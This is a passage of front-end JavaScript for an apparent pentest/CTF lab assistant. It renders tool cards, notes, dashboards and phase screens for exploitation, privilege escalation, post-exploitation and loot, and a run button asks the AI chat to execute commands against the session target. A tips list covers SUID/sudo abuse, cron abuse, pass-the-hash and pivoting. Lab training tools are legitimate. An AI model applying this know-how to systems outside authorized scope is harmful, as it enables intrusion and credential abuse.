      <div class="mtool-icon cat-${escHtml(tool.cat)}" style="background:rgba(0,0,0,0.2);color:${catColors[tool.cat]||'var(--text)'}">
        ${escHtml(tool.name.slice(0,2).toUpperCase())}
      </div>
      <div class="mtool-info">
        <div class="mtool-name">${escHtml(tool.name)} ${isCustom ? '<span style="font-size:9px;color:var(--accent);margin-left:4px">CUSTOM</span>' : ''}</div>
        <div class="mtool-desc" title="${escHtml(tool.cmd)}">${escHtml(tool.desc)} — <code style="font-size:9px">${escHtml(tool.cmd.slice(0,40))}${tool.cmd.length>40?'…':''}</code></div>
      </div>
      ${isCustom ? `<button class="mtool-remove-btn" data-tool-id="${escHtml(tool.id)}" title="Remove custom tool">Remove</button>` : '<span style="font-size:10px;color:var(--text-muted);flex-shrink:0">Built-in</span>'}
    </div>`;
  }).join('');

  // Wire remove buttons for custom tools
  list.querySelectorAll('.mtool-remove-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      AppState.customTools = (AppState.customTools || []).filter(t => t.id !== btn.dataset.toolId);
      renderManageToolsList();
      renderToolsPanel(($$('.tfil').find(b => b.classList.contains('active'))?.dataset.filter) || 'all');
      showToast('Tool removed', 'info');
    });
  });
}

// Render tool cards into #tools-list
function renderToolsPanel(filterCat = 'all', searchQ = '') {
  const list = $('#tools-list');
  if (!list) return;

  const tools = AppState.customTools ? [...DEFAULT_TOOLS, ...AppState.customTools] : DEFAULT_TOOLS;
  const q = searchQ.toLowerCase();

  const visible = tools.filter(t => {
    const catMatch = filterCat === 'all' || t.cat === filterCat;
    const searchMatch = !q || t.name.toLowerCase().includes(q) || t.desc.toLowerCase().includes(q) || t.cat.toLowerCase().includes(q);
    return catMatch && searchMatch;
  });

  if (visible.length === 0) {
    list.innerHTML = `<div style="padding:16px 8px;text-align:center;font-size:11px;color:var(--text-muted)">No tools match "${escHtml(searchQ || filterCat)}"</div>`;
    return;
  }

  list.innerHTML = visible.map(tool => `
    <div class="tool-card" data-filter="${escHtml(tool.cat)}" data-tool-id="${escHtml(tool.id)}">
      <div class="tool-card-icon cat-${escHtml(tool.cat)}">${escHtml(tool.name.slice(0,2).toUpperCase())}</div>
      <div class="tool-card-body">
        <div class="tool-card-name">${escHtml(tool.name)}</div>
        <div class="tool-card-desc">${escHtml(tool.desc)}</div>
      </div>
      <button class="tool-run-btn" data-tool-id="${escHtml(tool.id)}" title="Ask AI to run ${escHtml(tool.name)}">▶</button>
    </div>
  `).join('');

  // Wire run buttons — send message to AI asking to execute the tool
  list.querySelectorAll('.tool-run-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      const tool = tools.find(t => t.id === btn.dataset.toolId);
      if (!tool) return;
      const tab = getActiveTab();
      const target = tab?.session?.targetIp || tab?.session?.name || '{target}';
      const cmd = tool.cmd.replace(/\{target\}/g, target);
      if (typeof sendChatMessage === 'function') sendChatMessage(`Run ${tool.name}: \`${cmd}\``);
    });
  });

  // Wire card click — paste command into message input
  list.querySelectorAll('.tool-card').forEach(card => {
    card.addEventListener('click', (e) => {
      if (e.target.classList.contains('tool-run-btn')) return;
      const tool = tools.find(t => t.id === card.dataset.toolId);
      if (!tool) return;
      const tab = getActiveTab();
      const target = tab?.session?.targetIp || tab?.session?.name || '{target}';
      const cmd = tool.cmd.replace(/\{target\}/g, target);
      const inp = $('#message-input');
      if (inp) { inp.value = cmd; inp.focus(); if (typeof autoResizeInput === 'function') autoResizeInput(inp); }
    });
  });
}

// Render notes list into #notes-list
function renderNotesPanel(tab, tabName = 'notes') {
  const list = $('#notes-list');
  if (!list) return;

  // Migrate legacy .notes string into .notesList array
  if (tab?.session) {
    tab.session.notesList = tab.session.notesList || [];
    if (tab.session.notes && tab.session.notesList.length === 0) {
      tab.session.notesList.push({ id: generateId(), text: tab.session.notes, createdAt: Date.now(), bookmark: false });
    }
  }

  // Determine note source: session notes if session active, else global notes
  const isGlobal = !tab?.session;
  const notes = tab?.session?.notesList || (AppState.globalNotes = AppState.globalNotes || []);
  const showBookmarks = tabName === 'bookmarks';
  const filtered = showBookmarks ? notes.filter(n => n.bookmark) : notes;

  if (filtered.length === 0) {
    list.innerHTML = `<div style="padding:12px 8px;font-size:11px;color:var(--text-muted);text-align:center">${showBookmarks ? 'No bookmarks yet' : 'No notes — click + New Note'}</div>`;
    return;
  }

  list.innerHTML = filtered.map(note => `
    <div class="note-card" data-note-id="${escHtml(note.id)}">
      <div class="note-card-meta" style="display:flex;align-items:center;gap:4px;margin-bottom:4px">
        <span class="note-card-date" style="font-size:9px;color:var(--text-muted);flex:1">${new Date(note.createdAt).toLocaleDateString()}</span>
        <button class="note-bookmark-btn${note.bookmark ? ' bookmarked' : ''}" data-note-id="${escHtml(note.id)}" title="${note.bookmark ? 'Unbookmark' : 'Bookmark'}" style="background:none;border:none;cursor:pointer;font-size:12px;color:${note.bookmark ? 'var(--warning)' : 'var(--text-muted)'}">★</button>
        <button class="note-del-btn" data-note-id="${escHtml(note.id)}" title="Delete" style="background:none;border:none;cursor:pointer;font-size:13px;color:var(--text-muted)">×</button>
      </div>
      <textarea class="note-card-text" data-note-id="${escHtml(note.id)}" rows="3" placeholder="Write your note here..." style="width:100%;background:var(--input-bg);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:11px;padding:6px;resize:vertical;font-family:inherit">${escHtml(note.text)}</textarea>
    </div>
  `).join('');

  // Wire textarea auto-save on blur
  list.querySelectorAll('.note-card-text').forEach(ta => {
    ta.addEventListener('blur', () => {
      const n = notes.find(n => n.id === ta.dataset.noteId);
      if (n) {
        n.text = ta.value;
        if (tab?.session) autoSaveTab(tab);
      }
    });
  });

  // Wire bookmark buttons
  list.querySelectorAll('.note-bookmark-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const n = notes.find(n => n.id === btn.dataset.noteId);
      if (n) {
        n.bookmark = !n.bookmark;
        renderNotesPanel(tab, tabName);
        if (tab?.session) autoSaveTab(tab);
      }
    });
  });

  // Wire delete buttons
  list.querySelectorAll('.note-del-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const idx = notes.findIndex(n => n.id === btn.dataset.noteId);
      if (idx !== -1) {
        notes.splice(idx, 1);
        if (isGlobal) AppState.globalNotes = notes;
        else if (tab?.session) { tab.session.notesList = notes; autoSaveTab(tab); }
        renderNotesPanel(tab, tabName);
      }
    });
  });
}

// =============================================================================
// SECTION 3S2 — OVERVIEW SCREEN
// =============================================================================

function wireOverviewScreen() {
  const backBtn = $('#overview-back-btn');
  if (backBtn && !backBtn._wired) {
    backBtn._wired = true;
    backBtn.addEventListener('click', () => {
      // Go back to dashboard or lab depending on what's active
      const tab = getActiveTab();
      switchScreen(tab?.session ? 'lab' : 'dashboard');
    });
  }

  const newSessionBtn = $('#overview-new-session-btn');
  if (newSessionBtn && !newSessionBtn._wired) {
    newSessionBtn._wired = true;
    newSessionBtn.addEventListener('click', () => showNewSessionModal());
  }

  // Quick action buttons use event delegation
  const ovBody = $('#overview-body');
  if (ovBody && !ovBody._wired) {
    ovBody._wired = true;
    ovBody.addEventListener('click', (e) => {
      const btn = e.target.closest('.ov-action-btn');
      if (!btn) return;
      const screen = btn.dataset.screen;
      if (screen) {
        switchScreen(screen);
        if (screen === 'recon')    { if (typeof wireReconScreen === 'function') wireReconScreen(); }
        if (screen === 'commands') { if (typeof wireCommandsScreen === 'function') wireCommandsScreen(); }
        if (['exploits','enum','privesc','postex','loot'].includes(screen)) {
          if (typeof refreshPhaseScreen === 'function') refreshPhaseScreen(screen);
        }
      }
    });
  }

  renderOverviewScreen();
}

function renderOverviewScreen() {
  const tab = getActiveTab();
  const s = tab?.session;

  const bodyEl    = $('#overview-body');
  const noSessEl  = $('#overview-no-session');

  if (!s) {
    if (bodyEl)   bodyEl.style.display   = 'none';
    if (noSessEl) noSessEl.style.display = 'flex';
    return;
  }
  if (bodyEl)   bodyEl.style.display   = 'grid';
  if (noSessEl) noSessEl.style.display = 'none';

  const setTxt = (id, val) => { const el = $(id); if (el) el.textContent = val || '—'; };

  // Target info
  const sessionName = s.name || s.labName || (typeof s.target === 'object' ? s.target?.ip : s.target) || 'Unnamed Session';
  setTxt('#ov-target-name', sessionName);
  setTxt('#ov-ip',         s.targetIp       || s.target?.ip       || '—');
  setTxt('#ov-hostname',   s.targetHostname  || s.target?.hostname || '—');
  setTxt('#ov-os',         s.targetOs        || s.target?.os       || '—');
  setTxt('#ov-platform',   s.platform || '—');
  setTxt('#ov-difficulty', s.difficulty || '—');
  setTxt('#ov-duration',   s.startTime ? formatDuration(Date.now() - s.startTime) : '—');

  // Findings counters
  setTxt('#ov-ports',  s.findings?.ports?.length  || 0);
  setTxt('#ov-users',  s.findings?.users?.length  || 0);
  setTxt('#ov-creds',  s.findings?.credentials?.length || 0);
  setTxt('#ov-flags',  s.findings?.flags?.length  || 0);
  setTxt('#ov-cves',   s.findings?.cves?.length   || 0);
  setTxt('#ov-hashes', s.findings?.hashes?.length || 0);

  // Methodology phases
  const phasesEl = $('#ov-methodology-phases');
  if (phasesEl) {
    const phases    = s.methodology?.phases    || [];
    const completed = s.methodology?.completed || [];
    const active    = s.methodology?.activePhase;

    if (phases.length === 0) {
      phasesEl.innerHTML = '<div style="color:var(--text-muted);font-size:12px;padding:8px">No methodology phases — start or resume a session to track progress.</div>';
    } else {
      phasesEl.innerHTML = phases.map((phase, i) => {
        const isDone   = completed.includes(phase);
        const isActive = phase === active;
        const cls = isDone ? 'done' : isActive ? 'active' : '';
        const checkContent = isDone ? '✓' : isActive ? '▶' : String(i + 1);
        return `<div class="ov-phase-row ${cls}">
          <div class="ov-phase-check">${checkContent}</div>
          <span class="ov-phase-name">${escHtml(phase)}</span>
          ${isActive ? '<span class="ov-phase-badge">Active</span>' : ''}
          ${isDone   ? '<span class="ov-phase-badge done-badge">Done</span>' : ''}
        </div>`;
      }).join('');
    }
  }
}

// =============================================================================
// SECTION 3T — DASHBOARD SCREEN
// =============================================================================

const PENTEST_TIPS = [
  'Always run nmap with -sV -sC for service version detection and default scripts.',
  'Check robots.txt and sitemap.xml early — they often reveal hidden endpoints.',
  'LinPEAS and WinPEAS are your best friends for automated privesc enumeration.',
  'Look for password reuse: credentials found in one place often work elsewhere.',
  'enumerate SMB shares even if port 445 is filtered — try other ports too.',
  'GTFOBins is the go-to reference for SUID/sudo binary exploitation.',
  'Always check /etc/cron* and /var/spool/cron for scheduled tasks you can abuse.',
  'BloodHound visualises Active Directory attack paths that would take hours to find manually.',
  'Burp Suite\'s Intruder is powerful for fuzzing web params — set up your lists well.',
  'When stuck, ask the AI for a methodology walkthrough for the specific service.',
  'Document everything as you go — flags, credentials, and commands used.',
  'Check for default credentials before anything else on network services.',
  'Feroxbuster with a good wordlist beats dirb for recursive directory enumeration.',
  'Pass-the-hash works on Windows even when you can\'t crack the NTLM hash.',
  'Always pivot through a compromised host to reach internal network segments.',
];

function wireDashboardScreen() {
  // New session button
  const newBtn = $('#dash-new-session-btn');
  if (newBtn && !newBtn._wired) {
    newBtn._wired = true;
    newBtn.addEventListener('click', () => showNewSessionModal());
  }

  // Quick action buttons
  $$('.dash-action-btn').forEach(btn => {
    if (btn._wired) return; btn._wired = true;
    btn.addEventListener('click', () => {
      const screen = btn.dataset.screen;
      if (screen) {
        switchScreen(screen);
        if (screen === 'progress')  refreshProgressScreen();
        if (screen === 'tracker')   refreshTrackerScreen();
        if (screen === 'notes')     { if (typeof refreshNotesScreen === 'function') refreshNotesScreen(); }
        if (screen === 'bookmarks') { if (typeof refreshBookmarksScreen === 'function') refreshBookmarksScreen(); }
      }
    });
  });

  // Phase card buttons
  $$('.dash-phase-card').forEach(card => {
    if (card._wired) return; card._wired = true;
    card.addEventListener('click', () => {
      const screen = card.dataset.screen;
      if (screen) {
        switchScreen(screen);
        if (typeof refreshPhaseScreen === 'function') refreshPhaseScreen(screen);
      }
    });
  });

  renderDashboardScreen();
}

function renderDashboardScreen() {
  // Operator name
  const nameEl = $('#dash-operator-name');
  if (nameEl) {
    const opName = AppState.config?.operatorName
      || document.querySelector('.sidebar-username')?.textContent?.trim()
      || 'Operator';
    nameEl.textContent = opName;
  }

  // Stats
  const totalSessions = AppState.tabs.filter(t => t.session).length;
  let totalFlags = 0, totalMachines = 0, totalNotes = 0;
  AppState.tabs.forEach(t => {
    if (t.session) {
      totalFlags += (t.session.findings?.flags?.length || 0);
      if (t.session.findings?.flags?.length > 0) totalMachines++;
      totalNotes += (t.session.notesList?.length || 0);
    }
  });
  totalNotes += (AppState.globalNotes?.length || 0);

  const setStat = (id, val) => { const el = $(id); if (el) el.textContent = val; };
  setStat('#dash-stat-sessions', totalSessions);
  setStat('#dash-stat-flags', totalFlags);
  setStat('#dash-stat-machines', totalMachines);
  setStat('#dash-stat-notes', totalNotes);

  // Recent sessions
  const sessionsEl = $('#dash-recent-sessions');
  if (sessionsEl) {
    const sessions = AppState.tabs.filter(t => t.session).slice(-6).reverse();
    if (sessions.length === 0) {
      sessionsEl.innerHTML = '<div class="dash-empty">No sessions yet — click + New Session</div>';
    } else {
      sessionsEl.innerHTML = sessions.map(tab => {
        const s = tab.session;
        const dur = s.startTime ? formatDuration(Date.now() - s.startTime) : '';
        return `
          <div class="dash-session-row" data-tab-id="${escHtml(tab.id)}">
            <div class="dash-session-dot" style="background:${s.platform === 'HTB' ? '#9fef00' : s.platform === 'THM' ? '#e8211d' : 'var(--accent)'}"></div>
            <div class="dash-session-name">${escHtml(s.name || s.labName || (typeof s.target === 'object' ? (s.target?.ip || s.target?.hostname || '') : s.target) || 'Unnamed Session')}</div>
            <div class="dash-session-meta">${escHtml(s.platform || '')} · ${escHtml(dur)}</div>
          </div>`;
      }).join('');

      sessionsEl.querySelectorAll('.dash-session-row').forEach(row => {
        row.addEventListener('click', () => {
          const tabId = row.dataset.tabId;
          const tab = AppState.tabs.find(t => t.id === tabId);
          if (tab) {
            AppState.activeTabId = tabId;
            switchScreen('lab');
            if (typeof renderTabBar === 'function') renderTabBar();
            if (typeof renderSessionInfo === 'function') renderSessionInfo(tab.session);
          }
        });
      });
    }
  }

  // Tip of the day
  const tipEl = $('#dash-tip-text');
  if (tipEl) {
    const idx = new Date().getDate() % PENTEST_TIPS.length;
    tipEl.textContent = PENTEST_TIPS[idx];
  }
}

// =============================================================================
// SECTION 3U — PHASE SCREENS (Exploits, Enum, PrivEsc, Post, Loot)
// =============================================================================

// Per-phase config
const PHASE_CONFIG = {
  exploits: { cats: ['exploit'],           findingsKey: 'exploits',   inputId: 'exploits-new-input', statusId: 'exploits-new-status', saveId: 'exploits-new-save-btn', listId: 'exploits-findings-list', libId: 'exploits-library-list', searchId: 'exploits-lib-search' },
  enum:     { cats: ['enum','recon'],       findingsKey: 'enum',       inputId: 'enum-new-input',     statusId: 'enum-new-status',     saveId: 'enum-new-save-btn',     listId: 'enum-findings-list',     libId: 'enum-library-list',     searchId: 'enum-lib-search' },
  privesc:  { cats: ['privesc'],            findingsKey: 'privesc',    inputId: 'privesc-new-input',  statusId: 'privesc-new-status',  saveId: 'privesc-add-save-btn',  listId: 'privesc-findings-list',  libId: 'privesc-library-list',  searchId: 'privesc-lib-search' },
  postex:   { cats: ['post'],              findingsKey: 'postex',     inputId: 'postex-new-input',   statusId: 'postex-new-status',   saveId: 'postex-new-save-btn',   listId: 'postex-findings-list',   libId: 'postex-library-list',   searchId: 'postex-lib-search' },
  loot:     { cats: [],                    findingsKey: 'loot',       inputId: 'loot-new-input',     statusId: 'loot-new-type',       saveId: 'loot-new-save-btn',     listId: 'loot-findings-list',     libId: 'loot-quick-cmds',       searchId: null },
};

// AppState.phaseFindings[sessionId][phase] = [{id, text, status, createdAt}]
function getPhaseFindings(phase) {
  const tab = getActiveTab();
  const sessionId = tab?.session ? tab.id : '__global__';
  AppState.phaseFindings = AppState.phaseFindings || {};
  AppState.phaseFindings[sessionId] = AppState.phaseFindings[sessionId] || {};
  AppState.phaseFindings[sessionId][phase] = AppState.phaseFindings[sessionId][phase] || [];
  return AppState.phaseFindings[sessionId][phase];
}

function wirePhaseScreens() {
  // Wire .phase-back-btn (all phase screens share this class)
  document.addEventListener('click', (e) => {
    if (e.target.closest('.phase-back-btn')) switchScreen('dashboard');
  });

  // Wire each phase screen's add button and library
  Object.keys(PHASE_CONFIG).forEach(phase => {
    wireSinglePhaseScreen(phase);
  });

  // Wire loot quick command cards (copy to chat)
  $$('.loot-cmd-card').forEach(card => {
    if (card._wired) return; card._wired = true;
    card.addEventListener('click', () => copyToClipboard(card.dataset.cmd, card));
  });
}

function wireSinglePhaseScreen(phase) {
  const cfg = PHASE_CONFIG[phase];
  if (!cfg) return;

  // Save / add button
  const saveBtn = $(`#${cfg.saveId}`);
  if (saveBtn && !saveBtn._wired) {
    saveBtn._wired = true;
    saveBtn.addEventListener('click', () => {
      const inputEl  = $(`#${cfg.inputId}`);
      const statusEl = $(`#${cfg.statusId}`);
      const text   = (inputEl?.value || '').trim();
      if (!text) { showToast('Enter a value first', 'warning'); return; }
      const status = statusEl?.value || 'found';
      const findings = getPhaseFindings(phase);
      findings.unshift({ id: generateId(), text, status, createdAt: Date.now() });
      if (inputEl) inputEl.value = '';
      renderPhaseFindings(phase);
      savePhaseData();
      showToast('Finding added', 'success', 1200);
    });
    // Also allow Enter key in input
    const inputEl = $(`#${cfg.inputId}`);
    if (inputEl) {
      inputEl.addEventListener('keydown', (e) => { if (e.key === 'Enter') saveBtn.click(); });
    }
  }

  // Library search
  if (cfg.searchId) {
    const searchEl = $(`#${cfg.searchId}`);
    if (searchEl && !searchEl._wired) {
      searchEl._wired = true;
      searchEl.addEventListener('input', () => renderPhaseLibrary(phase, searchEl.value));
    }
  }
}

function refreshPhaseScreen(phase) {
  renderPhaseFindings(phase);
  renderPhaseLibrary(phase);
}

function renderPhaseFindings(phase) {
  const cfg = PHASE_CONFIG[phase];
  if (!cfg) return;
  const list = $(`#${cfg.listId}`);
  if (!list) return;

  const findings = getPhaseFindings(phase);
  if (findings.length === 0) {
    list.innerHTML = `<div class="phase-empty">No findings yet — add above or pick from the library</div>`;
    return;
  }

  list.innerHTML = findings.map(f => `
    <div class="phase-finding-row" data-finding-id="${escHtml(f.id)}">
      <span class="phase-finding-text">${escHtml(f.text)}</span>
      <span class="phase-finding-status ${escHtml(f.status)}">${escHtml(f.status)}</span>
      <button class="phase-finding-copy-btn" data-text="${escHtml(f.text)}" title="Copy">⧉</button>
      <button class="phase-finding-copy-btn" data-chat="${escHtml(f.text)}" title="Send to AI chat" style="font-size:12px">💬</button>
      <button class="phase-finding-del-btn" data-id="${escHtml(f.id)}" title="Delete">×</button>
    </div>
  `).join('');

  // Wire buttons
  list.querySelectorAll('.phase-finding-copy-btn[data-text]').forEach(btn => {
    btn.addEventListener('click', () => copyToClipboard(btn.dataset.text, btn));
  });
  list.querySelectorAll('.phase-finding-copy-btn[data-chat]').forEach(btn => {
    btn.addEventListener('click', () => {
      sendChatMessage(`Can you help me with this finding: ${btn.dataset.chat}`);
      switchScreen('lab');
    });
  });
  list.querySelectorAll('.phase-finding-del-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const findings = getPhaseFindings(phase);
      const idx = findings.findIndex(f => f.id === btn.dataset.id);
      if (idx !== -1) { findings.splice(idx, 1); renderPhaseFindings(phase); savePhaseData(); }
    });
  });
}

function renderPhaseLibrary(phase, query = '') {
  const cfg = PHASE_CONFIG[phase];
  if (!cfg || !cfg.libId) return;
  const libEl = $(`#${cfg.libId}`);
  if (!libEl || phase === 'loot') return; // loot has static cards

  const q = query.toLowerCase();
  const tools = DEFAULT_TOOLS.filter(t => {
    const catMatch = cfg.cats.length === 0 || cfg.cats.includes(t.cat);
    const searchMatch = !q || t.name.toLowerCase().includes(q) || t.desc.toLowerCase().includes(q);
    return catMatch && searchMatch;
  });

  if (tools.length === 0) {
    libEl.innerHTML = '<div class="phase-empty">No tools match</div>';
    return;
  }

  libEl.innerHTML = tools.map(tool => `
    <div class="phase-lib-card" data-tool-id="${escHtml(tool.id)}">
      <div class="phase-lib-icon">${escHtml(tool.name.slice(0,2).toUpperCase())}</div>
      <div class="phase-lib-info">
        <div class="phase-lib-name">${escHtml(tool.name)}</div>
        <div class="phase-lib-desc">${escHtml(tool.desc)}</div>
      </div>
      <button class="phase-lib-add-btn" data-tool-id="${escHtml(tool.id)}" title="Add to session findings">+ Add</button>
    </div>
  `).join('');

  libEl.querySelectorAll('.phase-lib-add-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      const tool = DEFAULT_TOOLS.find(t => t.id === btn.dataset.toolId);
      if (!tool) return;
      const findings = getPhaseFindings(phase);
      if (findings.some(f => f.text === tool.name)) { showToast('Already in findings', 'info'); return; }
      findings.unshift({ id: generateId(), text: tool.name, status: 'found', createdAt: Date.now() });
      renderPhaseFindings(phase);
      savePhaseData();
      btn.textContent = '✓'; btn.disabled = true;
      showToast(`${tool.name} added`, 'success', 1200);
    });
  });

  libEl.querySelectorAll('.phase-lib-card').forEach(card => {
    card.addEventListener('click', (e) => {
      if (e.target.classList.contains('phase-lib-add-btn')) return;
      const tool = DEFAULT_TOOLS.find(t => t.id === card.dataset.toolId);
      if (tool) {
        const tab = getActiveTab();
        const target = tab?.session?.targetIp || '{target}';
        const cmd = tool.cmd.replace(/\{target\}/g, target);
        const inp = $('#message-input');
        if (inp) { inp.value = cmd; inp.focus(); if (typeof autoResizeInput === 'function') autoResizeInput(inp); }
        switchScreen('lab');
      }
    });
  });
}

function savePhaseData() {
  // Phase data is in AppState.phaseFindings — auto-saved with session if active
  const tab = getActiveTab();
  if (tab?.session) {
    tab.session.phaseFindings = AppState.phaseFindings?.[tab.id] || {};
    autoSaveTab(tab);
  }
}

// =============================================================================
// SECTION 3P — NOTES SCREEN
// =============================================================================

function wireNotesScreen() {
  const backBtn = $('#notes-back-btn');
  if (backBtn && !backBtn._wired) {
    backBtn._wired = true;
    backBtn.addEventListener('click', () => {
      switchScreen(getActiveTab()?.session ? 'lab' : 'dashboard');
    });
  }

  const newBtn = $('#notes-screen-new-btn');
  if (newBtn && !newBtn._wired) {
    newBtn._wired = true;
    newBtn.addEventListener('click', () => {
      const note = { id: generateId(), text: '', createdAt: Date.now(), bookmark: false };
      AppState.globalNotes = AppState.globalNotes || [];
      AppState.globalNotes.unshift(note);
      renderNotesScreen();
      setTimeout(() => {
        const firstTA = document.querySelector('#notes-screen-grid textarea');
        if (firstTA) firstTA.focus();
      }, 50);
    });
  }

  const searchEl = $('#notes-screen-search');
  if (searchEl && !searchEl._wired) {
    searchEl._wired = true;
    searchEl.addEventListener('input', renderNotesScreen);
  }

  const filterEl = $('#notes-screen-filter');
  if (filterEl && !filterEl._wired) {
    filterEl._wired = true;
    filterEl.addEventListener('change', renderNotesScreen);
  }
}

function refreshNotesScreenFilter() {
  const filterEl = $('#notes-screen-filter');
  if (!filterEl) return;
  const sessionOptions = AppState.tabs
    .filter(t => t.session)
    .map(t => `<option value="session-${escHtml(t.id)}">${escHtml(t.session.name || t.session.labName || (typeof t.session.target === 'object' ? t.session.target?.ip : t.session.target) || 'Session')}</option>`)
    .join('');
  filterEl.innerHTML = `
    <option value="all">All Notes</option>
    <option value="global">Global Notes</option>
    ${sessionOptions}
  `;
}

function refreshNotesScreen() {
  refreshNotesScreenFilter();
  renderNotesScreen();
}

function renderNotesScreen() {
  const grid = $('#notes-screen-grid');
  if (!grid) return;

  const q = ($('#notes-screen-search')?.value || '').toLowerCase();
  const filter = $('#notes-screen-filter')?.value || 'all';

  let allNotes = [];

  if (filter === 'all' || filter === 'global') {
    (AppState.globalNotes || []).forEach(n => allNotes.push({ ...n, _source: 'Global', _tab: null }));
  }

  if (filter === 'all') {
    AppState.tabs.forEach(tab => {
      if (tab.session?.notesList) {
        tab.session.notesList.forEach(n => {
          allNotes.push({ ...n, _source: tab.session.name || tab.session.labName || (typeof tab.session.target === 'object' ? tab.session.target?.ip : tab.session.target) || 'Session', _tab: tab });
        });
      }
    });
  } else if (filter.startsWith('session-')) {
    const tabId = filter.replace('session-', '');
    const tab = AppState.tabs.find(t => t.id === tabId);
    if (tab?.session?.notesList) {
      tab.session.notesList.forEach(n => {
        allNotes.push({ ...n, _source: tab.session.name || 'Session', _tab: tab });
      });
    }
  }

  if (q) allNotes = allNotes.filter(n => (n.text || '').toLowerCase().includes(q) || (n._source || '').toLowerCase().includes(q));
  allNotes.sort((a, b) => b.createdAt - a.createdAt);

  if (allNotes.length === 0) {
    grid.innerHTML = `<div style="grid-column:1/-1;padding:40px;text-align:center;color:var(--text-muted);font-size:13px">${q ? 'No notes match your search' : 'No notes yet — click + New Note to start'}</div>`;
    return;
  }

  grid.innerHTML = allNotes.map(note => `
    <div class="note-full-card" data-note-id="${escHtml(note.id)}" data-tab-id="${note._tab ? escHtml(note._tab.id) : ''}">
      <div class="note-full-card-header">
        <span class="note-full-card-source">${escHtml(note._source)}</span>
        <span class="note-full-card-date">${new Date(note.createdAt).toLocaleDateString()}</span>
        <button class="note-screen-bookmark-btn${note.bookmark ? ' bookmarked' : ''}" data-note-id="${escHtml(note.id)}" title="${note.bookmark ? 'Unbookmark' : 'Bookmark'}" style="background:none;border:none;cursor:pointer;font-size:14px;color:${note.bookmark ? 'var(--warning)' : 'var(--text-muted)'}">★</button>
        <button class="note-screen-del-btn" data-note-id="${escHtml(note.id)}" title="Delete" style="background:none;border:none;cursor:pointer;font-size:15px;color:var(--text-muted)">×</button>
      </div>
      <textarea class="note-screen-text" data-note-id="${escHtml(note.id)}" rows="5" placeholder="Write your note here...">${escHtml(note.text)}</textarea>
    </div>
  `).join('');

  grid.querySelectorAll('.note-screen-text').forEach(ta => {
    ta.addEventListener('blur', () => {
      const noteId = ta.dataset.noteId;
      const card = ta.closest('.note-full-card');
      const tabId = card?.dataset.tabId;
      if (tabId) {
        const tab = AppState.tabs.find(t => t.id === tabId);
        if (tab?.session?.notesList) {
          const n = tab.session.notesList.find(n => n.id === noteId);
          if (n) { n.text = ta.value; autoSaveTab(tab); }
        }
      } else {
        const n = (AppState.globalNotes || []).find(n => n.id === noteId);
        if (n) n.text = ta.value;
      }
    });
  });

  grid.querySelectorAll('.note-screen-bookmark-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const noteId = btn.dataset.noteId;
      const card = btn.closest('.note-full-card');
      const tabId = card?.dataset.tabId;
      if (tabId) {
        const tab = AppState.tabs.find(t => t.id === tabId);
        const n = tab?.session?.notesList?.find(n => n.id === noteId);
        if (n) { n.bookmark = !n.bookmark; autoSaveTab(tab); }
      } else {
        const n = (AppState.globalNotes || []).find(n => n.id === noteId);
        if (n) n.bookmark = !n.bookmark;
      }
      renderNotesScreen();
    });
  });

  grid.querySelectorAll('.note-screen-del-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const noteId = btn.dataset.noteId;
      const card = btn.closest('.note-full-card');
      const tabId = card?.dataset.tabId;
      showConfirm('Delete this note?', (ok) => {
        if (!ok) return;
        if (tabId) {
          const tab = AppState.tabs.find(t => t.id === tabId);
          if (tab?.session?.notesList) {
            tab.session.notesList = tab.session.notesList.filter(n => n.id !== noteId);
            autoSaveTab(tab);
          }
        } else {
          AppState.globalNotes = (AppState.globalNotes || []).filter(n => n.id !== noteId);
        }
        renderNotesScreen();
      });
    });
  });
}

// =============================================================================
// SECTION 3Q — BOOKMARKS SCREEN
// =============================================================================

function wireBookmarksScreen() {
  const backBtn = $('#bookmarks-back-btn');
  if (backBtn && !backBtn._wired) {
    backBtn._wired = true;
    backBtn.addEventListener('click', () => {
      switchScreen(getActiveTab()?.session ? 'lab' : 'dashboard');
    });
  }

  const searchEl = $('#bookmarks-screen-search');
  if (searchEl && !searchEl._wired) {
    searchEl._wired = true;
    searchEl.addEventListener('input', renderBookmarksScreen);
  }
}

function refreshBookmarksScreen() {
  renderBookmarksScreen();
}

function renderBookmarksScreen() {
  const body = $('#bookmarks-screen-body');
  if (!body) return;

  const q = ($('#bookmarks-screen-search')?.value || '').toLowerCase();

  let bookmarks = [];
  (AppState.globalNotes || []).forEach(n => {
    if (n.bookmark) bookmarks.push({ ...n, _source: 'Global', _tab: null });
  });
  AppState.tabs.forEach(tab => {
    if (tab.session?.notesList) {
      tab.session.notesList.filter(n => n.bookmark).forEach(n => {
        bookmarks.push({ ...n, _source: tab.session.name || tab.session.target || 'Session', _tab: tab });
      });
    }
  });

  if (q) bookmarks = bookmarks.filter(n => (n.text || '').toLowerCase().includes(q) || (n._source || '').toLowerCase().includes(q));
  bookmarks.sort((a, b) => b.createdAt - a.createdAt);

  if (bookmarks.length === 0) {
    body.innerHTML = `<div style="padding:40px;text-align:center;color:var(--text-muted);font-size:13px">No bookmarks yet — star any note to pin it here</div>`;
    return;
  }

  body.innerHTML = `<div class="bookmarks-grid">${bookmarks.map(note => `
    <div class="bookmark-card" data-note-id="${escHtml(note.id)}" data-tab-id="${note._tab ? escHtml(note._tab.id) : ''}">
      <div class="bookmark-card-header">
        <span class="bookmark-card-source">${escHtml(note._source)}</span>
        <span class="bookmark-card-date">${new Date(note.createdAt).toLocaleDateString()}</span>
        <button class="bm-unbookmark-btn" data-note-id="${escHtml(note.id)}" title="Remove bookmark" style="background:none;border:none;cursor:pointer;font-size:14px;color:var(--warning)">★</button>
      </div>
      <div class="bookmark-card-text">${escHtml((note.text || '').slice(0, 300))}${(note.text || '').length > 300 ? '…' : ''}</div>
    </div>
  `).join('')}</div>`;

  body.querySelectorAll('.bm-unbookmark-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const noteId = btn.dataset.noteId;
      const card = btn.closest('.bookmark-card');
      const tabId = card?.dataset.tabId;
      if (tabId) {
        const tab = AppState.tabs.find(t => t.id === tabId);
